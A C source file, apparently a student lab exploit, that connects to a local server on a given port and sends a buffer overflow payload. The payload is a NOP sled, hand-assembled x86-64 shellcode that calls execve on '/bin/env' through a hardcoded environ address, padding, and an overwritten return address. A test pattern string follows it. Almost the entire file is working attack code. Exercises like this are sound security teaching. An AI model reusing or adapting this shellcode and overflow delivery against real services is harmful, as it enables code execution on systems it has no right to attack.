#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <netdb.h>

char inbuff[1024];

void DoAttack(int PortNo);
void Attack(FILE * outfile);

int main(int argc, char * argv[]){

    char * studStr, *portStr;
    int studLen, portLen;
    int studNo, portNo;
    int i;

    if (argc != 2){
        fprintf(stderr, "usage %s portno\n", argv[0]);
        exit(1);
    }

    portStr = argv[1];
    if ((portLen = strlen(portStr)) < 1){
        fprintf(stderr, "%s: port number must be 1 or more digits\n", argv[0]);
        exit(1);
    }
    for (i = 0; i < portLen; i++){
        if(!isdigit(portStr[i])){
            fprintf(stderr, "%s: port number must be all digits\n", argv[0]);
            exit(1);
        }
    }
    portNo = atoi(portStr);

    fprintf(stderr, "Port Number  %d\n", portNo);

    DoAttack(portNo);

    exit(0);
}

void  DoAttack(int portNo) {
    int server_sockfd;
    int serverlen;

    struct sockaddr_in server_address;

    FILE * outf;
    FILE * inf;
    struct hostent *h;


    server_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if((h=gethostbyname("localhost"))==NULL){
        fprintf(stderr,"Host Name Error...");
        exit(1);
    }

    server_address.sin_family = AF_INET;
    memcpy((char *) &server_address.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
    /* server_address.sin_addr.s_addr = htonl(INADDR_ANY); */
    server_address.sin_port = htons(portNo);

    if(connect(server_sockfd,(struct sockaddr*)&server_address,sizeof(struct sockaddr))==-1){
        fprintf(stderr,"Connection out...");
        exit(1);
    }

    outf = fdopen(server_sockfd, "w");

    // add log message here
    Attack(outf);

    inf = fdopen(server_sockfd, "r");
    if (inf == NULL){
        fprintf(stderr,"could not open socket for read");
        exit(1);
    }
    do {
        inbuff[0] = '\0';
        fgets(inbuff,1024,inf);
        if (inbuff[0]){
            fputs(inbuff,stdout);
        }
    } while (!feof(inf));
    fclose(outf);
    fclose(inf);
    return;
}

char compromise[224]={
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 8
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 16
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 24
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 32
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 40
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 48
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 56
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 64
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 72
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 80
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 88
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 96
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, // 104 nops 
    
    // 110 vvv
    // Clears the registers rax, rdi, rsi, and rdx (sets them to 0)
    0x48, 0x31, 0xC0,               // xor rax, rax
    0x48, 0x31, 0xFF,               // xor rdi, rdi
    0x48, 0x31, 0xF6,               // xor rsi, rsi
    0x48, 0x31, 0xD2,               // xor rdx, rdx

    0x50,                            // push rax
    0x48, 0xBF, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x65, 0x6E, //0x76,       // mov rdi, '/bin/env'
    0x76,

    0x57,                            // push rdi
    0x48, 0x89, 0xE7,                // mov rdi, rsp
    0x50,                            // push rax
    0x57,                            // push rdi
    0x48, 0x89, 0xE6,                // mov rsi, rsp
    0x48, 0x31, 0xD2,                // xor rdx, rdx
    0x66, 0xBA, 0xFF, 0x7F,          // mov dx, 0x7fff
    0x48, 0xC1, 0xE2, 0x20,          // shl rdx, 32
    0xB9, 0xFF, 0xE6, 0xFB, 0xF7,    // mov ecx, 0xf7fbe6ff

    // Clears the low 8 bits of rcx
    0x48, 0xC1, 0xE9, 0x08,          // shr rcx, 8
    0x48, 0xC1, 0xE1, 0x08,          // shl rcx, 8

    0x48, 0x09, 0xCA,                // or rdx, rcx
    0x48, 0x8B, 0x12,                // mov rdx, [rdx]
    0x48, 0x31, 0xC0,                // xor rax, rax
    0xB0, 0x3B,                      // mov al, 0x3b
    0x0F, 0x05,                      // syscall

    0x48, 0x89, 0xC7,                // mov rdi, rax
    0x48, 0x31, 0xC0,                // xor rax, rax
    0xB0, 0x3C,                      // mov al, 0x3c
    0x0F, 0x05,                      //syscall

    // Padding so that the stack doesn't overflow the code
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,

    // end:
    // rsp: 0x7fffffffe2b8 | 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x7F, 0x00 return address
    // rsp - 216(0xD8) = 0x7fffffffe1e0
    0xE0, 0xE1, 0xFF, 0xFF, 0xFF, 0x7F,

    0x0A,0x00
};

// Environ: 0x7ffff7fbe600 
char * compromise1=
    "xxxxxxxxxxxxxxxxxxxx" // 20
    "xxxxxxxxxxxxxxxxxxxx" // 40
    "xxxxxxxxxxxxxxxxxxxx" // 60
    "xxxxxxxxxxxxxxxxxxxx" // 80
    "xxxxxxxxxxxxxxxxxxxx" // 100
    "xxxxxxxxxxxxxxxxxxxx" // 120 
    "xxxxxxxxxxxxxxxxxxxx" // 140
    "xxxxxxxxxxxxxxxxxxxx" // 160
    "xxxxxxxxxxxxxxxxxxxx" // 180
    "xxxxxxxxxxxxxxxxxxxx" // 200
    "xxxxxxxx"		   // 208
    "MNOPWXYZ"		   // 216
    "xxxxxxxx\n";          // 224 + 2

// change to write so we can write NULLs
void Attack(FILE * outfile){
    //fprintf(outfile, "%s", "377 Student\n");  
    fprintf(outfile, "%s", compromise);
    fflush(outfile);
}

